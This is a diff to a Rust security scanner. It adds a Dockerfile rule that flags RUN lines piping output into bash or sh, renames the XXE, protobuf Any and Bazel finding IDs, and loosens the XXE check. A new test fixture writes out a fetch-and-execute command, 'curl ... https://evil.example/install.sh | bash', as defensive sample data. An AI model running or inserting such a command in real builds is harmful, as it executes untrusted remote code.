@@ -521,8 +521,7 @@ fn ascii_lower(source: &[u8]) -> Vec<u8> {
 fn find_dockerfile_slop(source: &[u8]) -> Vec<SlopFinding> {
     let lower = ascii_lower(source);
     let mut findings = Vec::new();
-    for (offset, line) in lower.split(|&b| b == b'\n').enumerate() {
-        let _ = offset;
+    for line in lower.split(|&b| b == b'\n') {
         let trimmed = trim_ascii_start(line);
         if trimmed.starts_with(b"add http://") || trimmed.starts_with(b"add https://") {
             let start = line_offset(&lower, line.as_ptr() as usize - lower.as_ptr() as usize);
@@ -534,6 +533,28 @@ fn find_dockerfile_slop(source: &[u8]) -> Vec<SlopFinding> {
                 severity: Severity::Critical,
             });
         }
+        if trimmed.starts_with(b"run ")
+            && trimmed.contains(&b'|')
+            && (trimmed.windows(b"| bash".len()).any(|w| w == b"| bash")
+                || trimmed.windows(b"| sh".len()).any(|w| w == b"| sh")
+                || trimmed
+                    .windows(b"|/bin/bash".len())
+                    .any(|w| w == b"|/bin/bash")
+                || trimmed.windows(b"|/bin/sh".len()).any(|w| w == b"|/bin/sh")
+                || trimmed
+                    .windows(b"| bash -c".len())
+                    .any(|w| w == b"| bash -c")
+                || trimmed.windows(b"| sh -c".len()).any(|w| w == b"| sh -c"))
+        {
+            let start = line_offset(&lower, line.as_ptr() as usize - lower.as_ptr() as usize);
+            findings.push(SlopFinding {
+                start_byte: start,
+                end_byte: start + line.len(),
+                description: "security:dockerfile_pipe_execution — Dockerfile `RUN` pipes command output into `bash` or `sh`; this enables opaque remote-code execution during image build and defeats provenance review.".to_string(),
+                domain: DOMAIN_ALL,
+                severity: Severity::Critical,
+            });
+        }
     }
     findings
 }
@@ -541,17 +562,16 @@ fn find_dockerfile_slop(source: &[u8]) -> Vec<SlopFinding> {
 fn find_xml_slop(source: &[u8]) -> Vec<SlopFinding> {
     let lower = ascii_lower(source);
     let has_doctype = lower.windows(b"<!doctype".len()).any(|w| w == b"<!doctype");
-    let has_entity = lower.windows(b"<!entity".len()).any(|w| w == b"<!entity");
     let has_external = lower.windows(b"system".len()).any(|w| w == b"system")
         || lower.windows(b"public".len()).any(|w| w == b"public");
-    if has_doctype && has_entity && has_external {
+    if has_doctype && has_external {
         vec![SlopFinding {
             start_byte: lower
                 .windows(b"<!doctype".len())
                 .position(|w| w == b"<!doctype")
                 .unwrap_or(0),
             end_byte: source.len(),
-            description: "security:xml_xxe — XML document declares an external entity via `DOCTYPE`/`ENTITY` with `SYSTEM` or `PUBLIC`; this is an XXE primitive that can trigger SSRF or local file disclosure.".to_string(),
+            description: "security:xxe_external_entity — XML document declares a `DOCTYPE` with `SYSTEM` or `PUBLIC`; this is an XXE external-entity primitive that can trigger SSRF or local file disclosure.".to_string(),
             domain: DOMAIN_ALL,
             severity: Severity::Critical,
         }]
@@ -568,7 +588,7 @@ fn find_proto_slop(source: &[u8]) -> Vec<SlopFinding> {
         vec![SlopFinding {
             start_byte: start,
             end_byte: start + "google.protobuf.Any".len(),
-            description: "security:proto_type_erasure — `google.protobuf.Any` introduces type-erased message ingestion; without an allowlisted unpack boundary it widens deserialization and privilege-confusion attack surface.".to_string(),
+            description: "security:protobuf_any_type_field — `google.protobuf.Any` introduces type-erased message ingestion; without an allowlisted unpack boundary it widens deserialization and privilege-confusion attack surface.".to_string(),
             domain: DOMAIN_FIRST_PARTY,
             severity: Severity::Critical,
         }]
@@ -596,7 +616,7 @@ fn find_starlark_slop(source: &[u8]) -> Vec<SlopFinding> {
                 findings.push(SlopFinding {
                     start_byte: start,
                     end_byte: end,
-                    description: "security:bazel_unpinned_http_archive — Bazel/Starlark remote fetch rule declares a URL without `sha256`; this permits supply-chain substitution or mirror tampering during repository resolution.".to_string(),
+                    description: "security:bazel_unverified_http_archive — Bazel/Starlark remote fetch rule declares a URL without `sha256`; this permits supply-chain substitution or mirror tampering during repository resolution.".to_string(),
                     domain: DOMAIN_ALL,
                     severity: Severity::Critical,
                 });
@@ -5828,12 +5848,7 @@ mod phase1_rd_tests {
 mod phase2_rd_tests {
     use super::find_java_slop_bytes_test as find_java_slop;
     use super::find_python_slop_ast_bytes_test as find_python_slop_ast_bytes;
-    use super::find_slop_bytes as find_slop;
     use super::*;
-
-    fn eng() -> &'static QueryEngine {
-        engine().expect("QueryEngine must initialise in tests")
-    }
 
     // ── Python dangerous-call AST walk ───────────────────────────────────────
 
@@ -6116,10 +6131,6 @@ mod phase3_rd_tests {
     use super::find_prototype_merge_sink_slop_bytes_test as find_prototype_merge_sink_slop;
     use super::find_slop_bytes as find_slop;
     use super::*;
-
-    fn eng() -> &'static QueryEngine {
-        engine().expect("QueryEngine must initialise in tests")
-    }
 
     // ── C# AST walk (TypeNameHandling + BinaryFormatter) ─────────────────────
 
@@ -7733,6 +7744,18 @@ mod phase7_rd_tests {
     }
 
     #[test]
+    fn test_find_slop_dispatches_dockerfile_pipe_execution() {
+        let src = b"FROM alpine:3.20\nRUN curl -fsSL https://evil.example/install.sh | bash\n";
+        let findings = find_slop("dockerfile", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("dockerfile_pipe_execution")),
+            "find_slop(dockerfile) must dispatch to Dockerfile pipe execution detector"
+        );
+    }
+
+    #[test]
     fn test_dockerfile_copy_clean() {
         let src = b"FROM alpine:3.20\nCOPY ./payload.tgz /tmp/payload.tgz\n";
         let findings = find_slop("dockerfile", src);
@@ -7747,7 +7770,9 @@ mod phase7_rd_tests {
 "#;
         let findings = find_slop("xml", src);
         assert!(
-            findings.iter().any(|f| f.description.contains("xml_xxe")),
+            findings
+                .iter()
+                .any(|f| f.description.contains("xxe_external_entity")),
             "find_slop(xml) must dispatch to XXE detector"
         );
     }
@@ -7765,7 +7790,7 @@ mod phase7_rd_tests {
         assert!(
             findings
                 .iter()
-                .any(|f| f.description.contains("proto_type_erasure")),
+                .any(|f| f.description.contains("protobuf_any_type_field")),
             "find_slop(proto) must dispatch to google.protobuf.Any detector"
         );
     }
@@ -7784,7 +7809,7 @@ mod phase7_rd_tests {
         assert!(
             findings
                 .iter()
-                .any(|f| f.description.contains("bazel_unpinned_http_archive")),
+                .any(|f| f.description.contains("bazel_unverified_http_archive")),
             "find_slop(bzl) must dispatch to unpinned http_archive detector"
         );
     }
